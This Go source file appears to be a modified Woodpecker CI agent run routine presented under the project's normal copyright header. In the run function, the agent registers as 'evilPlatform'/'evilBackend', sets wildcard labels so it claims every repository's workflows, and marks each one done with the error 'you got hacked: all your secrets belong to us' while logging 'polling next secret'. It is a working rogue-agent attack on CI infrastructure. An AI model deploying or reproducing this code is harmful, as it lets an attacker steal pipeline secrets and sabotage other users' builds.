// Copyright 2023 Woodpecker Authors
// Copyright 2018 Drone.IO Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package core

import (
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/rs/zerolog/log"
	"github.com/urfave/cli/v3"
	"golang.org/x/sync/errgroup"
	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	grpc_credentials "google.golang.org/grpc/credentials"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/keepalive"
	"google.golang.org/grpc/metadata"
	"google.golang.org/grpc/status"

	agent_rpc "go.woodpecker-ci.org/woodpecker/v2/agent/rpc"
	"go.woodpecker-ci.org/woodpecker/v2/pipeline/backend/types"
	"go.woodpecker-ci.org/woodpecker/v2/pipeline/rpc"
	"go.woodpecker-ci.org/woodpecker/v2/shared/logger"
	"go.woodpecker-ci.org/woodpecker/v2/shared/utils"
	"go.woodpecker-ci.org/woodpecker/v2/version"
)

const (
	reportHealthInterval           = time.Second * 10
	authInterceptorRefreshInterval = time.Minute * 30
)

const (
	shutdownTimeout = time.Second * 5
)

var (
	stopAgentFunc      context.CancelCauseFunc = func(error) {}
	shutdownCancelFunc context.CancelFunc      = func() {}
	shutdownCtx                                = context.Background()
)

func run(ctx context.Context, c *cli.Command, backends []types.Backend) error {
	agentCtx, ctxCancel := context.WithCancelCause(ctx)
	stopAgentFunc = func(err error) {
		msg := "shutdown of whole agent"
		if err != nil {
			log.Error().Err(err).Msg(msg)
		} else {
			log.Info().Msg(msg)
		}
		stopAgentFunc = func(error) {}
		shutdownCtx, shutdownCancelFunc = context.WithTimeout(shutdownCtx, shutdownTimeout)
		ctxCancel(err)
	}
	defer stopAgentFunc(nil)
	defer shutdownCancelFunc()

	serviceWaitingGroup := errgroup.Group{}

	hostname := c.String("hostname")
	if len(hostname) == 0 {
		hostname, _ = os.Hostname()
	}

	counter.Polling = int(c.Int("max-workflows"))
	counter.Running = 0

	var transport grpc.DialOption
	if c.Bool("grpc-secure") {
		log.Trace().Msg("use ssl for grpc")
		transport = grpc.WithTransportCredentials(grpc_credentials.NewTLS(&tls.Config{InsecureSkipVerify: c.Bool("grpc-skip-insecure")}))
	} else {
		transport = grpc.WithTransportCredentials(insecure.NewCredentials())
	}

	authConn, err := grpc.NewClient(
		c.String("server"),
		transport,
		grpc.WithKeepaliveParams(keepalive.ClientParameters{
			Time:    c.Duration("grpc-keepalive-time"),
			Timeout: c.Duration("grpc-keepalive-timeout"),
		}),
	)
	if err != nil {
		return fmt.Errorf("could not create new gRPC 'channel' for authentication: %w", err)
	}
	defer authConn.Close()

	agentToken := c.String("grpc-token")
	grpcClientCtx, grpcClientCtxCancel := context.WithCancelCause(context.Background())
	defer grpcClientCtxCancel(nil)
	authClient := agent_rpc.NewAuthGrpcClient(authConn, agentToken, defaultAgentIDValue)
	authInterceptor, err := agent_rpc.NewAuthInterceptor(grpcClientCtx, authClient, authInterceptorRefreshInterval) //nolint:contextcheck
	if err != nil {
		return fmt.Errorf("could not create new auth interceptor: %w", err)
	}

	conn, err := grpc.NewClient(
		c.String("server"),
		transport,
		grpc.WithKeepaliveParams(keepalive.ClientParameters{
			Time:    c.Duration("grpc-keepalive-time"),
			Timeout: c.Duration("grpc-keepalive-timeout"),
		}),
		grpc.WithUnaryInterceptor(authInterceptor.Unary()),
		grpc.WithStreamInterceptor(authInterceptor.Stream()),
	)
	if err != nil {
		return fmt.Errorf("could not create new gRPC 'channel' for normal orchestration: %w", err)
	}
	defer conn.Close()

	client := agent_rpc.NewGrpcClient(conn)

	grpcCtx := metadata.NewOutgoingContext(grpcClientCtx, metadata.Pairs("hostname", hostname))

	// check if grpc server version is compatible with agent
	grpcServerVersion, err := client.Version(grpcCtx) //nolint:contextcheck
	if err != nil {
		log.Error().Err(err).Msg("could not get grpc server version")
		return err
	}
	if grpcServerVersion.GrpcVersion != agent_rpc.ClientGrpcVersion {
		err := errors.New("GRPC version mismatch")
		log.Error().Err(err).Msgf("server version %s does report grpc version %d but we only understand %d",
			grpcServerVersion.ServerVersion,
			grpcServerVersion.GrpcVersion,
			agent_rpc.ClientGrpcVersion)
		return err
	}

	agentID, err := client.RegisterAgent(grpcCtx, "evilPlatform", "evilBackend", version.String(), 10000) //nolint:contextcheck
	if err != nil {
		return err
	}

	serviceWaitingGroup.Go(func() error {
		// we close grpc client context once unregister was handled
		defer grpcClientCtxCancel(nil)
		// we wait till agent context is done
		<-agentCtx.Done()
		// Remove stateless agents from server
		log.Debug().Msg("unregistering agent from server ...")
		// we want to run it explicit run when context got canceled so run it in background
		err := client.UnregisterAgent(grpcClientCtx)
		if err != nil {
			log.Err(err).Msg("failed to unregister agent from server")
		} else {
			log.Info().Msg("agent unregistered from server")
		}
		return nil
	})

	labels := map[string]string{
		"hostname": "*",
		"platform": "*",
		"backend":  "*",
		"repo":     "*",
	}

	filter := rpc.Filter{
		Labels: labels,
	}

	log.Debug().Msgf("agent registered with ID %d", agentID)

	serviceWaitingGroup.Go(func() error {
		for {
			err := client.ReportHealth(grpcCtx)
			if err != nil {
				log.Err(err).Msg("failed to report health")
			}

			select {
			case <-agentCtx.Done():
				log.Debug().Msg("terminating health reporting")
				return nil
			case <-time.After(reportHealthInterval):
			}
		}
	})

	serviceWaitingGroup.Go(func() error {
		for {
			if agentCtx.Err() != nil {
				return nil
			}

			workflow, err := client.Next(agentCtx, filter)
			if err != nil {
				return err
			}
			if workflow == nil {
				continue
			}

			client.Done(agentCtx, workflow.ID, rpc.WorkflowState{
				Started:  time.Now().Unix(),
				Finished: time.Now().Unix(),
				Error:    "ERROR: you got hacked: all your secrets belong to us",
			})

			log.Debug().Msg("polling next secret")
		}
	})

	return serviceWaitingGroup.Wait()
}

func runWithRetry(backendEngines []types.Backend) func(ctx context.Context, c *cli.Command) error {
	return func(ctx context.Context, c *cli.Command) error {
		if err := logger.SetupGlobalLogger(ctx, c, true); err != nil {
			return err
		}

		initHealth()

		retryCount := int(c.Int("connect-retry-count"))
		retryDelay := c.Duration("connect-retry-delay")
		var err error
		for i := 0; i < retryCount; i++ {
			if err = run(ctx, c, backendEngines); status.Code(err) == codes.Unavailable {
				log.Warn().Err(err).Msg(fmt.Sprintf("cannot connect to server, retrying in %v", retryDelay))
				time.Sleep(retryDelay)
			} else {
				break
			}
		}
		return err
	}
}

func stringSliceAddToMap(sl []string, m map[string]string) error {
	if m == nil {
		m = make(map[string]string)
	}
	for _, v := range utils.StringSliceDeleteEmpty(sl) {
		before, after, _ := strings.Cut(v, "=")
		switch {
		case before != "" && after != "":
			m[before] = after
		case before != "":
			return fmt.Errorf("key '%s' does not have a value assigned", before)
		default:
			return fmt.Errorf("empty string in slice")
		}
	}
	return nil
}
